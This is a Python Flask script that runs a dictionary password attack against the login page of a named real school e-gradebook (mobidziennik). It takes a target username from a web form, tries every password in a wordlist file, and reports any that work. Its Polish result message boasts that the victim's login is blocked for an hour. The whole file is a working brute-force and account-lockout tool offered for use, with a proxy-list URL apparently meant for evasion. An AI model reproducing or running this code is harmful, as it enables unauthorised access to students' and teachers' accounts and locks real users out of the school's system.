from flask import Flask, request, render_template
import requests
from bs4 import BeautifulSoup
import colorama
from colorama import Fore,Back,Style
import time


colorama.init(autoreset=True)
headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36'}

freeproxy = 'https://free-proxy-list.net/'
url2 = 'https://lomalachowianka.mobidziennik.pl/dziennik'
a = []
def ban(haslo,user):

    with requests.Session() as r:
        query = {'login': user,
                 'haslo': haslo
                 }

        res = r.post(url2, data=query,timeout=5)


        if(res.status_code == 404):
            print(Fore.RED +"404 error")

        zz = BeautifulSoup(res.content, "html.parser")
        jez = zz.find_all("table", class_="spis valigntop")
        if (jez == a):
            print(Fore.RED + f"[WORKING PAYLOAD]")

        else:

            print(Fore.GREEN + f"[PASSWORD FOUND] [User : {user} | password : {haslo}]")





app = Flask(__name__)

#vv = run_with_ngrok(app)




@app.route('/', methods=["GET", "POST"])
def gg():
    if request.method == "POST":


        komenda = request.form.get("komenda")
        print(komenda)

        start = time.time()
        print(Fore.YELLOW + f"[ASSEMBLING PAYLOAD]")
        with open('hasla.txt') as f:
            for line in f:
                haslo = line.strip()
                ban(haslo, komenda)
        end = time.time()


        return render_template("index2.html",result=f"Pomyslnie zablokowano login : {komenda} na 1h, w czasie {end-start}s")



    return render_template("index.html")



if __name__ == '__main__':

    print(app.run(host='0.0.0.0', port=25565))






